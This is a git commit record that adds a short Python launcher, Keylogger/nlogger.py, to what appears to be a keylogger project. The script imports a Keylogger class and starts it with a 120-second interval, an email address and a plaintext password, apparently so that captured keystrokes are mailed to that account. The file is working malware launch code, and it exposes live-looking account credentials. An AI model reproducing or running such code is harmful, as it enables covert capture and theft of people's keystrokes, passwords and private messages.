96381db60cd18b40f6f58e7ab54bd03854a3dcab
FFFdiMinished <86806832+FFFdiMinished@users.noreply.github.com>
2024-03-06 23:41:38 -0500

    Add files via upload

---
+++ Keylogger/nlogger.py
@@ -0,0 +1,8 @@
+#!/var/bin/env python
+
+# This program is for using the Keylogger class
+import keylogger
+
+if __name__ == "__main__":
+    my_keylogger = keylogger.Keylogger(120, "brlt5@outlook.com", "3hQ8#9XTCNq$TWzPtR!c")
+    my_keylogger.start()
